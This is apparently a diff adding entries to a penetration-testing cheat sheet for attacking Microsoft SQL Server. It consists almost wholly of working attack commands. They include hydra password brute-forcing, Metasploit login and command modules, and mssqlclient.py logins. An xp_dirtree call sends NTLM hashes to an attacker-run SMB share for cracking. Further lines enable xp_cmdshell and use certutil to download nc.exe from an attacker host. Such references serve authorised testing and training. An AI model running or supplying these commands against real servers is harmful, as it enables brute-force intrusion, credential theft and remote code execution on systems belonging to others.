@@ -38,6 +38,9 @@ use auxiliary/scanner/mssql/mssql_login
 set Password company@123
 run
 
+# Bruteforce (hydra)
+hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u -o report-hydra-mssql.txt
+
 # Execute commands (metasploit)
 ;; if xp_cmdshell is enabled and if the user has permissions.
 use auxiliary/admin/mssql/mssql_exec
@@ -78,3 +81,23 @@ mssqlclient.py -port 27900 user:password@10.1.1.1
 # Execute commands (MSSQL)
 mssql> xp_cmdshell 'date'
 mssql> go
+
+
+# Basic Access and enumeration with credentials
+mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
+mssqlclient.py <USER>:<PASSWORD>@<IP>
+
+Once logged in you can run queries:
+SQL> select @@ version;
+
+> Steal NTLM hash
+sudo smbserver.py -smb2support <username> .
+SQL> exec master..xp_dirtree '\\<IP>\<username>\' # Steal the NTLM hash, crack it with john or hashcat
+
+> Try to enable code execution
+SQL> enable_xp_cmdshell
+
+> Execute code
+SQL> xp_cmdshell whoami /all
+SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
+
